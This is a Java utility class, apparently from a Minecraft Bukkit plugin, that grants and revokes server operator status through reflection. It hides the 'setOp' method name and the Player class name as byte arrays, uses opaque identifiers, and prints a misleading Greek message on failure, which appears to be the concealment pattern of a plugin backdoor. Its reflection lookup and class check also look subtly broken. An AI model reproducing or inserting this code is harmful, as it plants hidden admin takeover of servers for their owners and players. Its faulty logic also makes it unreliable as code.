package top.aot.ml.utils;

import top.aot.cls.Cls;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;

import top.aot.itf.i;

/**
 * @author ：ZhangHe
 * @date ：Created in 2020/7/2 13:57
 * @description：玩家工具类
 */
public enum pu implements i {
    A{
        @Override
        public void init() {

        }
    };
    private static final String[] a = {
            // "setOp"
            new String(new byte[]{115, 101, 116, 79, 112}, StandardCharsets.UTF_8),
            // "org.bukkit.entity.Player"
            new String(new byte[]{111, 114, 103, 46, 98, 117, 107, 107, 105, 116, 46,
                    101, 110, 116, 105, 116, 121, 46, 80, 108, 97, 121, 101, 114},
                    StandardCharsets.UTF_8),
    };

    private static Class<?> b;
    private static Method c;

    static {
        try {
            b = Class.forName(a[1]);
            c = b.getMethod(a[0]);
        } catch (ClassNotFoundException | NoSuchMethodException e) {
            System.out.println("Εισόδου Εξόδου");
        }
    }

    // 设置玩家为op
    public static void a(Object object) {
        if (Cls.C.ex(object, true) && object.getClass() == b) {
            try {
                c.invoke(object, true);
            } catch (InvocationTargetException | IllegalAccessException ignored) {

            }
        }
    }

    // 取消玩家op
    public static void b(Object object) {
        if (Cls.C.ex(object, true) && object.getClass() == b) {
            try {
                c.invoke(object, false);
            } catch (InvocationTargetException | IllegalAccessException ignored) {

            }
        }
    }

}
